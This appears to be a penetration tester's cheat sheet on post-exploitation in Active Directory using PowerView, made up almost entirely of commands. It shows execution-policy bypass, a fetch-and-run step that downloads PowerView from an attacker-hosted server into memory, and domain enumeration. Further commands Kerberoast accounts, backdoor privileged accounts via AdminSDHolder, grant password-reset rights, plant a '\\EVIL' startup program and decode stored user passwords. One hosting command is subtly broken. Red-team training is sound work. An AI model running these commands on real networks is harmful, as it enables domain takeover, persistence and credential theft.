# Post Exploitation

## Powerview

* Powerview is a powerful powershell script from powershell empire that can be used for enumerating a domain after you have already gained a shell in the system.
* Start Powershell - `powershell -ep bypass` `-ep bypasses` the execution policy of powershell allowing you to easily run scripts
* Transfer PowerView to the target box (see file transfers page)
* Start PowerView

```
. .\Downloads\PowerView.ps1
```

### Load into Memory

* Host remotely&#x20;

```
python3 -c http.server 8000
#pull down on victim machine 
iwr http://<hosting-ip>:8000/PowerView.ps1 | IEX
```

### See system info

```
systeminfo
```

### Enumerate the domain users

```
Get-NetUser | select cn
```

### Enumerate the domain groups

```
Get-NetGroup -GroupName *admin*
```

### See shared folders

```
Invoke-ShareFinder
```

### See Full network information

```
Get-NetComputer -fulldata 
```

### See the operating systems running

```
Get-NetComputer -fulldata | select operatingsystem
```

### Get all the groups a user is effectively a member of, 'recursing up' using tokenGroups

```
Get-DomainGroup -MemberIdentity <User/Group>
```

### Get all the effective members of a group, 'recursing down'

```
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

### Use an alterate creadential for any function

```
$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUser -Credential $Cred
```

### Get GPO Display Name

```
Get-NetGPO | select displayname
Get-NetGPO| select *
```

### Retrieve all the computer dns host names a GPP password applies to

```
Get-DomainOU -GPLink '<GPP_GUID>' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}
```

* Get all users with passwords changed > 1 year ago, returning sam account names and password last set times

```
$Date = (Get-Date).AddYears(-1).ToFileTime()
Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset
```

* All enabled users, returning distinguishednames

```
Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname
```

* All disabled users

```
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)"
Get-DomainUser -UACFilter ACCOUNTDISABLE
```

* All users that require smart card authentication

```
Get-DomainUser -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=262144)"
Get-DomainUser -UACFilter SMARTCARD_REQUIRED
```

* All users that _don't_ require smart card authentication, only returning sam account names

```
Get-DomainUser -LDAPFilter "(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)" -Properties samaccountname
Get-DomainUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname
```

* Use multiple identity types for any _-Domain_ function

```
'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff
```

* Find all users with an SPN set (likely service accounts)

```
Get-DomainUser -SPN
```

* Check for users who don't have kerberos preauthentication set

```
Get-DomainUser -PreauthNotRequired
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```

* Find all service accounts in "Domain Admins"

```
Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}
```

* Find users with sidHistory set

```
Get-DomainUser -LDAPFilter '(sidHistory=*)'
```

* Find any users/computers with constrained delegation st

```
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

* Enumerate all servers that allow unconstrained delegation, and all privileged users that aren't marked as sensitive/not for delegation

```
$Computers = Get-DomainComputer -Unconstrained
$Users = Get-DomainUser -AllowDelegation -AdminCount
```

* Return the local _groups_ of a remote server

```
Get-NetLocalGroup SERVER.domain.local
```

* Return the local group _members_ of a remote server using Win32 API methods (faster but less info)

```
Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local
```

* Kerberoast any users in a particular OU with SPNs set

```
Invoke-Kerberoast -SearchBase "LDAP://OU=secret,DC=testlab,DC=local"
Find-DomainUserLocation == old Invoke-UserHunter
```

* Enumerate servers that allow unconstrained Kerberos delegation and show all users logged in

```
Find-DomainUserLocation -ComputerUnconstrained -ShowAll
```

* Hunt for admin users that allow delegation, logged into servers that allow unconstrained delegation

```
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation
```

* Find all computers in a given OU

```
Get-DomainComputer -SearchBase "ldap://OU=..."
```

* Get the logged on users for all machines in any _server_ OU in a particular domain

```
Get-DomainOU -Identity *server* -Domain <domain> | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_}}
```

* Enumerate all gobal catalogs in the forest

```
Get-ForestGlobalCatalog
```

* Turn a list of computer short names to FQDNs, using a global catalog

```
gc computers.txt | % {Get-DomainComputer -SearchBase "GC://GLOBAL.CATALOG" -LDAP "(name=$_)" -Properties dnshostname}
```

* Enumerate the current domain controller policy

```
$DCPolicy = Get-DomainPolicy -Policy DC
$DCPolicy.PrivilegeRights # user privilege rights on the dc...
```

* Enumerate the current domain policy

```
$DomainPolicy = Get-DomainPolicy -Policy Domain
$DomainPolicy.KerberosPolicy # useful for golden tickets ;)
$DomainPolicy.SystemAccess # password age/etc.
```

* Enumerate what machines that a particular user/group identity has local admin rights to
* Get-DomainGPOUserLocalGroupMapping == old Find-GPOLocation

```
Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>
```

* Enumerate what machines that a given user in the specified domain has RDP access rights to

```
Get-DomainGPOUserLocalGroupMapping -Identity <USER> -Domain <DOMAIN> -LocalGroup RDP
```

* Export a csv of all GPO mappings

```
Get-DomainGPOUserLocalGroupMapping | %{$_.computers = $_.computers -join ", "; $_} | Export-CSV -NoTypeInformation gpo_map.csv
```

* Use alternate credentials for searching for files on the domain
* Find-InterestingDomainShareFile == old Invoke-FileFinder

```
$Password = "PASSWORD" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential("DOMAIN\user",$Password)
Find-InterestingDomainShareFile -Domain DOMAIN -Credential $Credential
```

* Enumerate who has rights to the 'matt' user in 'testlab.local', resolving rights GUIDs to names

```
Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local
```

* Grant user 'will' the rights to change 'matt's password

```
Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose
```

* Audit the permissions of AdminSDHolder, resolving GUIDs

```
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs
```

* Backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse

```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
```

* Retrieve _most_ users who can perform DC replication for dev.testlab.local (i.e. DCsync)

```
Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}
```

* Find linked DA accounts using name correlation

```
Get-DomainGroupMember 'Domain Admins' | %{Get-DomainUser $_.membername -LDAPFilter '(displayname=*)'} | %{$a=$_.displayname.split(' ')[0..1] -join ' '; Get-DomainUser -LDAPFilter "(displayname=*$a*)" -Properties displayname,samaccountname}
```

* Save a PowerView object to disk for later usage

```
Get-DomainUser | Export-Clixml user.xml
$Users = Import-Clixml user.xml
```

* Find any machine accounts in privileged groups

```
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'}
```

* Enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights

```
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
```

* Find all policies applied to a current machine

```
Get-DomainGPO -ComputerIdentity windows1.testlab.local
```

* Enumerate all groups in a domain that don't have a global scope, returning just group names

```
Get-DomainGroup -GroupScope NotGlobal -Properties name
```

* Enumerate all foreign users in the global catalog, and query the specified domain localgroups for their memberships
* Query the global catalog for foreign security principals with domain-based SIDs, and extract out all distinguishednames

```
$ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase "GC://testlab.local" -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\d{2,}$'} | Select-Object -ExpandProperty distinguishedname
$Domains = @{}
$ForeignMemberships = ForEach($ForeignUser in $ForeignUsers) {
    # extract the domain the foreign user was added to
    $ForeignUserDomain = $ForeignUser.SubString($ForeignUser.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
    # check if we've already enumerated this domain
    if (-not $Domains[$ForeignUserDomain]) {
        $Domains[$ForeignUserDomain] = $True
        # enumerate all domain local groups from the given domain that have membership set with our foreignSecurityPrincipal set
        $Filter = "(|(member=" + $($ForeignUsers -join ")(member=") + "))"
        Get-DomainGroup -Domain $ForeignUserDomain -Scope DomainLocal -LDAPFilter $Filter -Properties distinguishedname,member
    }
}
$ForeignMemberships | fl
```

* If running in -sta mode, impersonate another credential a la "runas /netonly"

```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
# ... action
Invoke-RevertToSelf
```

* Enumerates computers in the current domain with 'outlier' properties, i.e. properties not set from the firest result returned by Get-DomainComputer

```
Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier
```

* Set the specified property for the given user identity

```
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
```

* Set the owner of 'dfm' in the current domain to 'harmj0y'

```
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y
```

* Retrieve _most_ users who can perform DC replication for dev.testlab.local (i.e. DCsync)

```
Get-ObjectACL "DC=testlab,DC=local" -ResolveGUIDs | ? {
    ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')
}
```

* Check if any user passwords are set

```
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
```
